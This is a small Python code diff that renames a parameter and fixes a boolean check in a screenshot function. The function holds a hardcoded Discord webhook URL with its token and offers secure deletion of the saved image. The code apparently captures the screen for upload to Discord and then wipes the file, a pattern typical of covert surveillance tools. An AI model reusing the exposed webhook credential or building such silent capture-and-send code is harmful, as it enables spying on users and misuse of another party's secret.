@@ -3,7 +3,7 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 import srm
 
 #configs
-def screenshot(srm):
+def screenshot(srm_opt):
     hook = 'https://discordapp.com/api/webhooks/745098847881265303/QJRM5MbF7fHAuidNelyK4HsJUveTDhusqqt8OjvKMyFxjw17kJoq7x9VLzvSBHdGNzLz'
 
     #take screenshot and save to running directory
@@ -24,5 +24,5 @@ def screenshot(srm):
 
 #option to remove file
 
-    if srm == true():
+    if srm_opt == True:
         srm.srm('screen.png')
